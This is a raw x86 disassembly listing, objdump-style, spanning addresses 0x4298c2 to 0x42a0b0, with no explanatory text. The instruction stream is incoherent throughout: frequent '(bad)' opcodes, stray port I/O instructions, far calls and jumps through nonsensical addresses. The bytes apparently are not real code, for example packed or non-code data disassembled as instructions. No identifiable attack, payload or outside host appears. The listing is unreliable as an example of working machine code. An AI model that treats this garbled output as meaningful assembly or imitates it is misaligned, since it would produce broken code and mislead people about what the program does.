  4298c2:	call   DWORD PTR [ebp+0x108eff00]
  4298c8:	int3   
  4298c9:	add    BYTE PTR [esi],ch
  4298cb:	ins    BYTE PTR es:[edi],dx
  4298cc:	mov    DWORD PTR [eax+0x75ffbfff],edx
  4298d2:	add    BYTE PTR [edi-0x1],ah
  4298d5:	add    cl,bh
  4298d7:	test   eax,0x5eccffff
  4298dc:	push   DWORD PTR [esi-0x44fff201]
  4298e2:	call   edi
  4298e4:	cmp    edi,0xffffffc1
  4298e7:	dec    eax
  4298e8:	add    bh,bh
  4298ea:	ds mov edx,0x22ff3e83
  4298f0:	jmp    DWORD PTR [ebx-0x7d]
  4298f3:	add    BYTE PTR [eax],0x83
  4298f6:	xor    BYTE PTR [ebx+0x0],bh
  4298f9:	cmp    DWORD PTR [edx-0xf],0x0
  4298fd:	(bad)  
  4298fe:	int3   
  4298ff:	dec    esp
  429900:	cmp    DWORD PTR [ecx-0x77],0x16
  429904:	(bad)  
  429905:	push   DWORD PTR [edx+ebp*4-0x1]
  429909:	call   FWORD PTR [ebp+ebx*8-0x1]
  42990d:	test   DWORD PTR [ebx-0x7c2bff79],eax
  429913:	dec    eax
  429914:	(bad)  
  429915:	jmp    DWORD PTR [ebp-0x5a]
  429918:	add    ah,cl
  42991a:	mov    ds:0xdf00bb,al
  42991f:	push   edx
  429920:	jmp    esp
  429922:	int3   
  429923:	xchg   ah,cl
  429925:	cmp    DWORD PTR [esi+0x37],0x0
  429929:	(bad)  
  42992a:	cmp    eax,DWORD PTR [eax+0x0]
  42992d:	mov    ds:0xacff7200,eax
  429932:	call   DWORD PTR [esi+0xfc9cccc]
  429938:	add    BYTE PTR [eax],al
  42993a:	adc    ebp,DWORD PTR [edi]
  42993c:	add    BYTE PTR [ecx+0x5c834e83],ah
  429942:	add    BYTE PTR [ebx-0x292cff01],bl
  429948:	add    bh,bh
  42994a:	mov    edx,0xff4289b3
  42994f:	pop    edx
  429950:	adc    DWORD PTR [edi+edi*8+0x25],0xffffffff
  429955:	call   ecx
  429957:	or     al,BYTE PTR [eax]
  429959:	jmp    FWORD PTR [edi]
  42995b:	data16 (bad) 
  42995d:	fisttp QWORD PTR [ecx-0x7ced7c89]
  429963:	in     al,dx
  429964:	(bad)  
  429965:	call   FWORD PTR [ebp-0x60ff7cb6]
  42996b:	or     eax,DWORD PTR [eax]
  42996d:	dec    edi
  42996e:	(bad)  
  42996f:	out    dx,eax
  429970:	push   DWORD PTR [ebx-0x34]
  429973:	cs mov edi,edi
  429976:	cmp    ebp,DWORD PTR [edi-0x1]
  429979:	(bad)  
  42997a:	(bad)  
  42997b:	clc    
  42997c:	add    BYTE PTR [ebx-0x77],dl
  42997f:	pop    es
  429980:	add    dl,dl
  429982:	mov    DWORD PTR [ecx-0x1],edi
  429985:	add    BYTE PTR [ebx+0x7],cl
  429988:	inc    DWORD PTR [ebx+0x2bff2f77]
  42998e:	and    edi,0xffffff89
  429991:	retf   
  429992:	sbb    DWORD PTR [eax-0x34],0xffffffff
  429996:	xor    BYTE PTR [ebp-0xe7b7c01],dl
  42999c:	int3   
  42999d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42999e:	inc    DWORD PTR [edi]
  4299a0:	int3   
  4299a1:	adc    BYTE PTR [ebx-0x40760092],al
  4299a7:	stos   DWORD PTR es:[edi],eax
  4299a8:	cmp    edi,0x1f
  4299ab:	je     0x429979
  4299ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4299ae:	inc    DWORD PTR [eax-0x7d]
  4299b1:	stc    
  4299b2:	sbb    DWORD PTR [ebx],0xffffffcc
  4299b5:	mov    DWORD PTR [esi+0x3c],eax
  4299b8:	inc    DWORD PTR [eax]
  4299ba:	dec    eax
  4299bb:	pop    ds
  4299bc:	add    BYTE PTR [edi-0x7c5701],dh
  4299c2:	cmp    ecx,0xffffffff
  4299c5:	add    BYTE PTR [ecx],cl
  4299c7:	dec    edi
  4299c8:	add    BYTE PTR [eax],al
  4299ca:	loop   0x42997d
  4299cc:	add    BYTE PTR [ebx+eax*4+0x52],dl
  4299d0:	push   DWORD PTR [ebp-0xff5d00]
  4299d6:	fs aas 
  4299d8:	inc    DWORD PTR [ebx+0x4a001de2]
  4299de:	add    BYTE PTR [edi+0x0],dl
  4299e1:	test   BYTE PTR [ebx+0x1ffff56],0xc8
  4299e8:	add    bh,bh
  4299ea:	push   esp
  4299eb:	mov    cl,0xff
  4299ed:	fmul   st,st(4)
  4299ef:	ss mov esi,eax
  4299f2:	add    BYTE PTR [esi+0x0],al
  4299f5:	call   DWORD PTR [esi+0x27ff009a]
  4299fb:	inc    edi
  4299fc:	mov    DWORD PTR [esi-0x7d],ebx
  4299ff:	jg     0x429a00
  429a01:	mov    DWORD PTR [eax],0xc7cc8311
  429a07:	jmp    0xe710670b
  429a0c:	mov    esi,esp
  429a0e:	call   FWORD PTR [eax-0x7d]
  429a11:	dec    edx
  429a12:	add    BYTE PTR [ebx],bl
  429a14:	or     esp,0xffffffe5
  429a17:	add    eax,DWORD PTR [eax]
  429a19:	add    BYTE PTR [edi-0x7a],dh
  429a1c:	(bad)  
  429a1d:	(bad)  
  429a1f:	add    edi,edi
  429a21:	std    
  429a22:	int3   
  429a23:	call   0xffff:0x6cae00ff
  429a2a:	pop    ecx
  429a2b:	(bad)  
  429a2c:	jmp    DWORD PTR [esi]
  429a2e:	push   DWORD PTR [edi+edi*8-0x15]
  429a32:	add    BYTE PTR [ebx],bl
  429a34:	(bad)  
  429a35:	call   DWORD PTR [eax+0x24]
  429a38:	add    DWORD PTR [ebx+0x100d919],0xffffff83
  429a3f:	fcos   
  429a41:	and    BYTE PTR [eax],al
  429a43:	jp     0x429a45
  429a45:	add    BYTE PTR [ebx],bl
  429a47:	xor    edi,edi
  429a49:	(bad)  
  429a4a:	fucomp st(4)
  429a4c:	add    DWORD PTR [esi+0x4dffdcff],0xffffff89
  429a53:	adc    DWORD PTR [eax],eax
  429a55:	add    DWORD PTR [eax-0x507600d1],0x53
  429a5c:	add    DWORD PTR [esi-0x8ffa100],0xffffffff
  429a63:	sbb    edi,edi
  429a65:	jmp    DWORD PTR [ebp-0xf]
  429a68:	dec    esp
  429a6a:	loopne 0x429a37
  429a6c:	add    BYTE PTR [edx+0x0],ah
  429a6f:	(bad)  
  429a70:	push   esi
  429a72:	add    bl,ah
  429a74:	(bad)  
  429a75:	push   DWORD PTR [eax+ebp*1+0x0]
  429a79:	jmp    DWORD PTR [eax-0x267cc3]
  429a7f:	cmp    al,0x83
  429a81:	retf   
  429a82:	dec    DWORD PTR [edi+edi*8]
  429a85:	call   DWORD PTR [esi-0x36]
  429a88:	add    DWORD PTR [ebx+0x3dfff4aa],0xffffff83
  429a8f:	xor    al,0xff
  429a91:	sbb    edi,edi
  429a93:	ins    DWORD PTR es:[edi],dx
  429a94:	inc    DWORD PTR [eax]
  429a96:	adc    eax,0x1583ff30
  429a9b:	lods   eax,DWORD PTR ds:[esi]
  429a9c:	add    bl,ah
  429a9e:	push   esi
  429aa0:	add    dh,al
  429aa2:	jmp    FWORD PTR [eax]
  429aa4:	(bad)  
  429aa5:	call   FWORD PTR [esi]
  429aa7:	mov    bl,0xff
  429aa9:	inc    DWORD PTR [esi+ecx*1+0x0]
  429aad:	and    al,0x0
  429aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ab0:	dec    DWORD PTR [edx-0xff8d01]
  429ab6:	cmp    BYTE PTR [esi-0x77],bh
  429ab9:	sbb    DWORD PTR [ecx-0xfaff94],0xffffffd0
  429ac0:	inc    DWORD PTR [ecx]
  429ac2:	add    BYTE PTR [edi-0x34],cl
  429ac5:	add    ah,dl
  429ac7:	outs   dx,DWORD PTR ds:[esi]
  429ac8:	add    DWORD PTR [ebx-0x47ff5608],0x0
  429acf:	mov    al,0xff
  429ad1:	and    al,BYTE PTR [ebx-0x327c0069]
  429ad7:	stos   BYTE PTR es:[edi],al
  429ad8:	or     esp,0x27
  429adb:	sbb    cl,ah
  429add:	(bad)  
  429ade:	sbb    DWORD PTR [ebx],0xffffff83
  429ae1:	sub    BYTE PTR [ecx+0x61ff0045],cl
  429ae7:	mov    ds:0xd0b98300,al
  429aec:	push   DWORD PTR [ebp-0x5300ea00]
  429af2:	add    ch,cl
  429af4:	inc    DWORD PTR [eax]
  429af6:	out    0x88,al
  429af8:	int3   
  429af9:	jmp    ecx
  429afb:	adc    BYTE PTR [ebx-0x19ff65],al
  429b01:	pop    esi
  429b02:	mov    DWORD PTR [ebx-0x1],ebx
  429b05:	sub    DWORD PTR [ecx+0x2],0xffffffcc
  429b09:	call   DWORD PTR [ecx]
  429b0b:	outs   dx,DWORD PTR ds:[esi]
  429b0c:	call   eax
  429b0e:	add    bh,bl
  429b10:	int3   
  429b11:	mov    ebp,0x8bff
  429b16:	mov    BYTE PTR [ebp+0x15fe00ff],ch
  429b1c:	jmp    FWORD PTR [edi]
  429b1e:	add    cl,cl
  429b20:	push   esi
  429b22:	(bad)  
  429b23:	mov    edx,0x6102ffff
  429b28:	mov    DWORD PTR [ebx+0x42ff32e6],eax
  429b2e:	push   DWORD PTR [eax+0x0]
  429b31:	sbb    edi,edi
  429b33:	mov    ds:0x4d72cc00,eax
  429b38:	add    BYTE PTR [eax],al
  429b3a:	outs   dx,BYTE PTR ds:[esi]
  429b3b:	inc    BYTE PTR [eax]
  429b3d:	sbb    edi,edi
  429b3f:	add    DWORD PTR [eax],0x8367ffe8
  429b45:	call   DWORD PTR [esp+edx*8+0x79740089]
  429b4c:	push   ecx
  429b4e:	call   ebp
  429b50:	call   DWORD PTR [edi-0x33c200]
  429b56:	xchg   ecx,eax
  429b57:	iret   
  429b58:	add    bh,bh
  429b5a:	lods   al,BYTE PTR ds:[esi]
  429b5b:	sbb    edi,edi
  429b5d:	mov    esp,0x76ff5e89
  429b62:	mov    DWORD PTR [ecx+0x5f100ff],esi
  429b68:	add    BYTE PTR [ecx+0x48ff99b5],cl
  429b6e:	jmp    DWORD PTR [edx-0x1]
  429b71:	and    DWORD PTR [ecx-0x3c7c00ec],ecx
  429b77:	push   eax
  429b78:	inc    DWORD PTR [eax]
  429b7a:	cvtpi2ps xmm0,QWORD PTR [eax]
  429b7d:	in     al,dx
  429b7e:	add    BYTE PTR [edi-0x1],ch
  429b81:	add    eax,0xffbe83
  429b86:	aas    
  429b87:	es int3 
  429b89:	push   DWORD PTR [edx-0x24]
  429b8c:	add    BYTE PTR [ecx-0x1],ch
  429b8f:	(bad)  
  429b90:	dec    DWORD PTR [ebx]
  429b92:	xor    DWORD PTR [edx+0x3f00ffff],0xffffffff
  429b99:	dec    DWORD PTR [ebx-0x7cc3ffb2]
  429b9f:	xor    BYTE PTR [eax],al
  429ba1:	fmul   st(4),st
  429ba3:	jno    0x429ba4
  429ba5:	cmp    esp,0xffffffc9
  429ba8:	inc    DWORD PTR [eax]
  429baa:	xchg   edi,eax
  429bab:	or     eax,0x73009a00
  429bb0:	add    BYTE PTR [eax+0x835600],dl
  429bb6:	in     al,0x3
  429bb8:	add    BYTE PTR [eax],al
  429bba:	or     eax,0x835e00f0
  429bbf:	loope  0x429bc1
  429bc1:	pop    eax
  429bc2:	add    BYTE PTR [ebp+0x3f3effff],ch
  429bc8:	(bad)  
  429bc9:	(bad)  
  429bca:	fadd   DWORD PTR [edx]
  429bcc:	inc    DWORD PTR [edx-0x14000800]
  429bd2:	call   DWORD PTR [edi+edi*8-0x34]
  429bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bd7:	ret    0xff89
  429bda:	sub    al,0xd2
  429bdc:	dec    eax
  429bde:	(bad)  
  429bdf:	jnp    0x429be0
  429be1:	add    BYTE PTR [eax],al
  429be3:	push   esp
  429be4:	inc    DWORD PTR [ebx+0x5190]
  429bea:	arpl   WORD PTR [ebx-0x1],si
  429bed:	inc    edi
  429bee:	push   DWORD PTR [edi+edi*8-0xe]
  429bf2:	push   DWORD PTR [edx]
  429bf4:	add    BYTE PTR [eax],al
  429bf6:	ins    DWORD PTR es:[edi],dx
  429bf7:	mov    ecx,0x5321ffcc
  429bfc:	sub    DWORD PTR [eax-0x6c76bb01],0xffffffcc
  429c03:	push   ss
  429c04:	add    ah,cl
  429c06:	or     al,0x20
  429c08:	add    BYTE PTR [eax],al
  429c0a:	pop    esp
  429c0b:	pop    edx
  429c0c:	(bad)  
  429c0d:	mov    esp,0xa200f7ff
  429c12:	dec    DWORD PTR [ecx+0x76bdff00]
  429c18:	inc    DWORD PTR [eax]
  429c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c1b:	and    eax,0x41ffbcff
  429c20:	push   edx
  429c22:	mov    DWORD PTR [ebx],ebp
  429c24:	dec    esp
  429c26:	js     0x429bba
  429c28:	cmp    edi,0xffffffb2
  429c2b:	pop    ds
  429c2c:	mov    DWORD PTR [edi],edi
  429c2e:	add    BYTE PTR ds:0xa600d700,bh
  429c34:	add    DWORD PTR [ebx+0x8327ee],0x4d
  429c3b:	or     DWORD PTR [eax],eax
  429c3d:	mov    DWORD PTR [eax],0x5eff27
  429c43:	dec    ebx
  429c44:	inc    DWORD PTR [eax]
  429c46:	into   
  429c47:	push   ebx
  429c48:	add    BYTE PTR [eax],al
  429c4a:	mov    ecx,0x89ef00b9
  429c4f:	add    DWORD PTR [ebx-0x5d00d1],0x0
  429c56:	iret   
  429c57:	ror    BYTE PTR [ecx-0x892877],0x4c
  429c5e:	call   DWORD PTR [esi-0x1]
  429c61:	ds int3 
  429c63:	adc    DWORD PTR [ecx-0x3325e101],ecx
  429c69:	int3   
  429c6a:	(bad)  
  429c6b:	mov    bh,bh
  429c6d:	cmp    bh,bh
  429c6f:	(bad)  
  429c71:	cmp    bh,bh
  429c73:	mov    eax,0xf6d3ff83
  429c78:	add    BYTE PTR [eax],al
  429c7a:	ds add bh,bh
  429c7d:	ret    0x71ff
  429c80:	call   DWORD PTR [ecx+0xff94ff]
  429c86:	retf   
  429c87:	aad    0x83
  429c89:	add    bh,cl
  429c8b:	mov    edi,0xd68377ff
  429c90:	int3   
  429c91:	xor    edi,edi
  429c93:	scas   al,BYTE PTR es:[edi]
  429c94:	add    ah,cl
  429c96:	mov    ecx,0xc800ff52
  429c9b:	out    0x0,eax
  429c9d:	xchg   BYTE PTR [ecx-0x3385ff71],cl
  429ca3:	sub    al,BYTE PTR [ebx-0x76fd6200]
  429ca9:	inc    DWORD PTR [edi]
  429cab:	(bad)  
  429cad:	sub    BYTE PTR [eax],al
  429caf:	hlt    
  429cb0:	int3   
  429cb1:	cld    
  429cb2:	inc    esp
  429cb4:	dec    esp
  429cb6:	(bad)  
  429cb7:	in     eax,0xff
  429cb9:	mov    DWORD PTR [ecx+esi*2],eax
  429cbc:	push   DWORD PTR [ebx]
  429cbe:	(bad)  
  429cbf:	fiadd  WORD PTR [eax]
  429cc1:	mov    edi,edi
  429cc3:	(bad)  
  429cc4:	dec    esp
  429cc6:	dec    edi
  429cc7:	(bad)  
  429cc8:	(bad)  
  429cc9:	(bad)  
  429cca:	cmp    BYTE PTR [eax+eax*1],dl
  429ccd:	fild   DWORD PTR [eax]
  429ccf:	push   esi
  429cd0:	dec    esp
  429cd2:	add    BYTE PTR [esi-0x1],bl
  429cd5:	push   ebp
  429cd7:	cmp    bh,bh
  429cd9:	add    BYTE PTR [ebp+0x7b],al
  429cdc:	mov    DWORD PTR [edi-0x6100dc00],ecx
  429ce2:	int3   
  429ce3:	daa    
  429ce4:	dec    DWORD PTR [ecx+0xfffdb9]
  429cea:	or     ebx,esi
  429cec:	jmp    DWORD PTR [edi+edi*8-0x17]
  429cf0:	int3   
  429cf1:	mov    dl,0xff
  429cf3:	and    eax,0x3fc700ff
  429cf8:	add    bh,bh
  429cfa:	add    BYTE PTR [esi-0x1],ch
  429cfd:	or     bh,bh
  429cff:	inc    ebp
  429d00:	(bad)  
  429d01:	fmul   st(4),st
  429d03:	aas    
  429d04:	add    bh,bh
  429d06:	dec    esp
  429d07:	mov    bh,0x83
  429d09:	add    BYTE PTR [ebx],dl
  429d0b:	mov    edx,0x12fffd83
  429d10:	or     DWORD PTR [edi-0x7c7ca900],0x64
  429d17:	(bad)  
  429d18:	inc    DWORD PTR [eax]
  429d1a:	dec    ecx
  429d1b:	in     al,dx
  429d1c:	jmp    DWORD PTR [ebx+0x5c834189]
  429d22:	adc    ebp,0xffffffff
  429d25:	sbb    DWORD PTR [ecx+0x3583ff55],0x7c
  429d2c:	add    BYTE PTR [esi-0xb007701],bl
  429d32:	call   FWORD PTR [eax+eax*1]
  429d35:	add    BYTE PTR [eax],bl
  429d37:	and    ah,cl
  429d39:	add    BYTE PTR [ebx-0x910047],al
  429d3f:	int3   
  429d40:	dec    esi
  429d42:	inc    esp
  429d44:	add    BYTE PTR [eax],al
  429d46:	into   
  429d47:	test   edi,edi
  429d49:	mov    DWORD PTR [ebx-0x76a100c9],ebp
  429d4f:	xchg   ecx,eax
  429d50:	and    edi,0xffffff89
  429d53:	int3   
  429d54:	mov    DWORD PTR [ebx-0x76ff7c31],eax
  429d5a:	enter  0xffad,0xa0
  429d5e:	(bad)  
  429d5f:	stc    
  429d60:	push   DWORD PTR [edi-0x34]
  429d63:	fcos   
  429d65:	add    BYTE PTR [esi+edx*2-0x2cce0000],al
  429d6c:	mov    DWORD PTR [ebp-0x4e33de00],edi
  429d72:	add    bl,ch
  429d74:	add    BYTE PTR [eax],al
  429d76:	jae    0x429d61
  429d78:	or     esp,0xffffffb9
  429d7b:	inc    eax
  429d7c:	or     DWORD PTR [edi+edi*8-0x7cbf00ee],0xfffffffc
  429d84:	add    BYTE PTR [eax],al
  429d86:	es inc ebx
  429d88:	add    BYTE PTR [eax],al
  429d8a:	cld    
  429d8b:	out    dx,eax
  429d8c:	add    BYTE PTR [esi-0x433eb00],al
  429d92:	add    BYTE PTR [ecx-0x1],bh
  429d95:	add    cl,cl
  429d97:	sub    eax,0xf555ffff
  429d9c:	jmp    FWORD PTR [eax]
  429d9e:	add    BYTE PTR ds:0x66ff4fff,dl
  429da4:	int3   
  429da5:	int3   
  429da6:	jmp    0x429d7e
  429da8:	inc    DWORD PTR [eax]
  429daa:	call   FWORD PTR [esi-0x4033d301]
  429db0:	dec    eax
  429db2:	mov    DWORD PTR [esi+0x73340083],edi
  429db8:	add    bh,bh
  429dba:	(bad)  
  429dbb:	adc    al,0xff
  429dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429dbe:	call   FWORD PTR [eax-0x25000b01]
  429dc4:	inc    DWORD PTR [eax]
  429dc6:	in     eax,0xd9
  429dc8:	add    DWORD PTR [eax],0x5a
  429dcb:	int3   
  429dcc:	add    DWORD PTR ds:0x11ff6b83,0xffffffff
  429dd3:	test   bh,bh
  429dd5:	dec    DWORD PTR [esi-0x64]
  429dd8:	inc    DWORD PTR [eax]
  429dda:	jno    0x429dc6
  429ddc:	int3   
  429ddd:	push   esp
  429dde:	add    BYTE PTR [eax],ch
  429de0:	call   DWORD PTR [ebx]
  429de2:	add    bl,dl
  429de4:	mov    DWORD PTR [ebx-0xf4db],eax
  429dea:	mov    ebx,0xcc0f8332
  429def:	popf   
  429df0:	add    BYTE PTR [ecx],cl
  429df2:	jmp    ebp
  429df4:	(bad)  
  429df5:	call   DWORD PTR [edx-0x32]
  429df8:	add    BYTE PTR [ebx+0x4d008faa],al
  429dfe:	add    BYTE PTR [edi],ah
  429e00:	add    DWORD PTR [eax+eax*1],0xfffffff7
  429e04:	inc    DWORD PTR [eax]
  429e06:	fidivr DWORD PTR [esi]
  429e08:	int3   
  429e09:	add    BYTE PTR [edx+0x65],ah
  429e0c:	add    BYTE PTR [eax],cl
  429e0e:	call   FWORD PTR [ebp-0x1]
  429e11:	or     al,0xff
  429e13:	lods   eax,DWORD PTR ds:[esi]
  429e14:	(bad)  
  429e15:	jmp    DWORD PTR [ebp+0x89ff46]
  429e1b:	adc    eax,0x5c00ce00
  429e20:	call   DWORD PTR [ebx+eax*4]
  429e23:	(bad)  
  429e24:	add    bh,bh
  429e26:	outs   dx,DWORD PTR ds:[esi]
  429e27:	mov    al,BYTE PTR [ebx-0x7cc5477d]
  429e2d:	retf   
  429e2e:	add    bh,ah
  429e30:	mov    DWORD PTR [ebp-0x1],edi
  429e33:	in     eax,dx
  429e34:	cmp    edi,0xffffff9c
  429e37:	jb     0x429e38
  429e39:	jmp    FWORD PTR [esi-0x68]
  429e3c:	add    BYTE PTR [eax+0x0],ah
  429e3f:	push   ds
  429e40:	jmp    edx
  429e42:	inc    DWORD PTR [ebx+0x0]
  429e45:	call   DWORD PTR [ebx-0x6b]
  429e48:	add    bh,bh
  429e4a:	xor    al,0xbf
  429e4c:	sbb    edi,0xffffffff
  429e4f:	clc    
  429e50:	inc    DWORD PTR [esi+0x0]
  429e53:	push   eax
  429e54:	add    BYTE PTR [eax],al
  429e56:	cmp    esp,DWORD PTR [edx]
  429e58:	add    ah,cl
  429e5a:	lods   eax,DWORD PTR ds:[esi]
  429e5b:	pushf  
  429e5c:	add    BYTE PTR [ecx+0x0],dl
  429e5f:	cmp    bh,0x11
  429e62:	jmp    FWORD PTR [ebp-0x126e0100]
  429e68:	add    BYTE PTR [eax],al
  429e6a:	mov    esp,0xffe9ff1c
  429e6f:	fwait
  429e70:	add    BYTE PTR [edi-0x7cfffc01],al
  429e76:	pop    ss
  429e77:	je     0x429e78
  429e79:	push   DWORD PTR [ebx]
  429e7b:	ja     0x429e00
  429e7d:	sbb    al,0x0
  429e7f:	(bad)  
  429e80:	mov    DWORD PTR [ecx-0x332b01],ebp
  429e86:	or     eax,0xcecc83e2
  429e8b:	add    al,0x83
  429e8d:	es call ecx
  429e90:	dec    ecx
  429e92:	(bad)  
  429e93:	mov    edx,0x5e63ff89
  429e98:	add    BYTE PTR [eax],al
  429e9a:	mov    ah,0xe5
  429e9c:	cmp    DWORD PTR [ebx],0xffffffff
  429e9f:	jmp    0xff00:0xf583df00
  429ea6:	lahf   
  429ea7:	ins    DWORD PTR es:[edi],dx
  429ea8:	inc    DWORD PTR [ebx-0x5533b305]
  429eae:	add    BYTE PTR [ebx],cl
  429eb0:	push   DWORD PTR ds:0xff21ff
  429eb6:	iret   
  429eb7:	call   0x2b0a22bb
  429ebc:	mov    DWORD PTR [edx+0x78fff600],ebx
  429ec2:	adc    ecx,0xffffffff
  429ec5:	int3   
  429ec6:	mov    ebx,0x7cff83bf
  429ecb:	dec    ecx
  429ecc:	add    BYTE PTR [edi+0x7500e1ff],dh
  429ed2:	inc    DWORD PTR [ecx]
  429ed4:	add    BYTE PTR [eax],al
  429ed6:	add    BYTE PTR [edx],0x83
  429ed9:	xor    esp,0xffffffa2
  429edc:	(bad)  
  429edd:	jg     0x429ede
  429edf:	xchg   ebx,eax
  429ee0:	sbb    ebx,0xffffffff
  429ee3:	mov    ebp,0xa4e2ff00
  429ee8:	(bad)  
  429ee9:	call   DWORD PTR [esi]
  429eeb:	dec    ecx
  429eec:	call   DWORD PTR [ebp-0x29764700]
  429ef2:	mov    DWORD PTR [ebp+0x70a3ccff],esi
  429ef8:	dec    DWORD PTR [ecx-0x3a7c8928]
  429efe:	add    BYTE PTR [ecx],dh
  429f00:	jmp    FWORD PTR [ebx-0x76ff9b01]
  429f06:	repnz repz inc DWORD PTR [eax]
  429f0a:	pop    ecx
  429f0b:	xor    BYTE PTR [eax],al
  429f0d:	sbb    ah,cl
  429f0f:	enter  0xca00,0xff
  429f13:	(bad)  
  429f15:	add    bh,cl
  429f17:	js     0x429f19
  429f19:	call   DWORD PTR [ebx-0x7c787cd0]
  429f1f:	lods   al,BYTE PTR ds:[esi]
  429f20:	int3   
  429f21:	aaa    
  429f22:	add    BYTE PTR [edi],al
  429f24:	add    DWORD PTR [eax],0x73
  429f27:	xor    BYTE PTR [eax],al
  429f29:	inc    DWORD PTR [esp+ecx*1]
  429f2c:	add    DWORD PTR [edi-0x7e000b00],0x0
  429f33:	cli    
  429f34:	(bad)  
  429f35:	inc    esi
  429f37:	push   cs
  429f38:	inc    DWORD PTR [eax]
  429f3a:	adc    al,cl
  429f3c:	add    BYTE PTR [ebp+0x0],ah
  429f3f:	loope  0x429f40
  429f41:	int3   
  429f42:	inc    DWORD PTR [ebx+0x3cd30000]
  429f48:	inc    DWORD PTR [eax]
  429f4a:	rcl    BYTE PTR [edi+edi*8-0x330aff4a],cl
  429f51:	jb     0x429f52
  429f53:	(bad)  
  429f55:	(bad)  
  429f56:	jmp    0x429f6d
  429f58:	dec    DWORD PTR [ecx-0x4500712f]
  429f5e:	jmp    DWORD PTR [eax-0x1]
  429f61:	scas   al,BYTE PTR es:[edi]
  429f62:	cmp    DWORD PTR [edx],0xffffff83
  429f65:	int3   
  429f66:	es (bad) 
  429f68:	inc    DWORD PTR [eax]
  429f6a:	xchg   ebx,eax
  429f6b:	sahf   
  429f6c:	add    dh,ch
  429f6e:	add    esp,0x0
  429f71:	adc    ecx,esp
  429f73:	jg     0x429f74
  429f75:	mov    DWORD PTR ds:0x1bffff19,edi
  429f7b:	call   0xf241bf4c
  429f80:	mov    DWORD PTR [edi],esi
  429f82:	dec    DWORD PTR [esi+0x783bffcc]
  429f88:	(bad)  
  429f89:	inc    DWORD PTR [ebp+0x5e]
  429f8c:	push   DWORD PTR [eax+eax*1-0x643372]
  429f93:	test   eax,0x6d7100ff
  429f98:	or     DWORD PTR [ecx-0x3d7c30be],0x0
  429f9f:	outs   dx,DWORD PTR ds:[esi]
  429fa0:	add    BYTE PTR [edx],al
  429fa2:	add    BYTE PTR [eax],bh
  429fa4:	add    BYTE PTR [ebx+0xccf694],al
  429faa:	pop    edx
  429fab:	mov    edi,edi
  429fad:	(bad)  
  429fae:	jmp    FWORD PTR [edi+edi*8]
  429fb1:	sbb    edi,edi
  429fb3:	add    cl,BYTE PTR [ecx-0x7cef5601]
  429fb9:	call   FWORD PTR [edi-0x334c00f4]
  429fbf:	sub    al,BYTE PTR [eax]
  429fc1:	loopne 0x429fc3
  429fc3:	leave  
  429fc4:	add    bh,bh
  429fc6:	adc    al,0x4a
  429fc8:	add    bh,bh
  429fca:	es jb  0x429fcc
  429fcd:	(bad)  
  429fce:	jmp    FWORD PTR [edx+0x1e00aa00]
  429fd4:	dec    DWORD PTR [ecx-0x767c8400]
  429fda:	aas    
  429fdb:	retf   
  429fdc:	(bad)  
  429fdd:	jg     0x429fde
  429fdf:	or     bh,bh
  429fe1:	and    bh,bh
  429fe3:	inc    BYTE PTR [eax]
  429fe5:	add    BYTE PTR [ecx],ch
  429fe7:	adc    eax,0x40bdffff
  429fec:	dec    eax
  429fee:	int3   
  429fef:	scas   al,BYTE PTR es:[edi]
  429ff0:	int3   
  429ff1:	aaa    
  429ff2:	(bad)  
  429ff3:	fiadd  DWORD PTR [eax]
  429ff5:	call   FWORD PTR [ecx+edi*2]
  429ff8:	(bad)  
  429ff9:	jmp    FWORD PTR [ebp-0x73]
  429ffc:	jmp    DWORD PTR [ecx+0x8ffccff]
  42a002:	mov    ebx,ebx
  42a004:	(bad)  
  42a005:	(bad)  
  42a006:	(bad)  
  42a008:	(bad)  
  42a009:	(bad)  
  42a00a:	cld    
  42a00b:	inc    ebp
  42a00c:	mov    DWORD PTR [ebx+eax*4],ebp
  42a00f:	stos   DWORD PTR es:[edi],eax
  42a010:	call   DWORD PTR [edx+0xffcbff]
  42a016:	sub    al,0xd3
  42a018:	(bad)  
  42a019:	call   DWORD PTR [edx+esi*1-0x757cd301]
  42a020:	add    BYTE PTR [ecx],ah
  42a022:	and    DWORD PTR [edi-0x77],0x0
  42a026:	ins    DWORD PTR es:[edi],dx
  42a027:	ins    DWORD PTR es:[edi],dx
  42a028:	(bad)  
  42a029:	inc    DWORD PTR [edi-0x331dffe5]
  42a02f:	imul   eax,DWORD PTR [ebx+0x5fff28],0x0
  42a036:	or     ah,0x0
  42a039:	adc    DWORD PTR [eax+eax*2+0x758982ff],0xffffffff
  42a041:	dec    edi
  42a042:	add    BYTE PTR [edi+edi*8-0x77],bh
  42a046:	hlt    
  42a047:	dec    eax
  42a048:	add    bh,bh
  42a04a:	nop
  42a04b:	stos   BYTE PTR es:[edi],al
  42a04c:	add    BYTE PTR [eax],dl
  42a04e:	jmp    FWORD PTR ds:0x53ffec83
  42a054:	cmp    edi,0x29
  42a057:	jne    0x429fe2
  42a059:	(bad)  
  42a05a:	cmp    esp,DWORD PTR [eax+eax*1+0x6d00b7]
  42a061:	jo     0x42a063
  42a063:	add    al,0xcc
  42a065:	(bad)  
  42a066:	fcmovb st,st(1)
  42a068:	add    BYTE PTR [eax],al
  42a06a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a06b:	das    
  42a06c:	call   DWORD PTR [edi-0x43ff1600]
  42a072:	add    BYTE PTR [esi+0x0],ah
  42a075:	add    BYTE PTR [ecx],bl
  42a077:	mov    edi,0xc214ffff
  42a07c:	sub    DWORD PTR [esi+0x17ff13ff],0x0
  42a083:	push   0x0
  42a085:	jmp    FWORD PTR [esi+0x51]
  42a088:	add    ah,cl
  42a08a:	cmp    eax,0xffe8ffb8
  42a08f:	popf   
  42a090:	(bad)  
  42a091:	mov    ecx,0xff3500
  42a096:	push   ecx
  42a097:	out    0x83,eax
  42a099:	(bad)  
  42a09a:	fist   DWORD PTR [edi+0x74830a00]
  42a0a0:	add    cl,ah
  42a0a2:	push   DWORD PTR [edx-0x1]
  42a0a5:	jmp    DWORD PTR [esi-0x4d]
  42a0a8:	cmp    edi,0x5e
  42a0ab:	dec    esi
  42a0ac:	(bad)  
  42a0ad:	(bad)  
  42a0af:	scas   al,BYTE PTR es:[edi]
  42a0b0:	jmp    FWORD PTR [edi+edi*8]
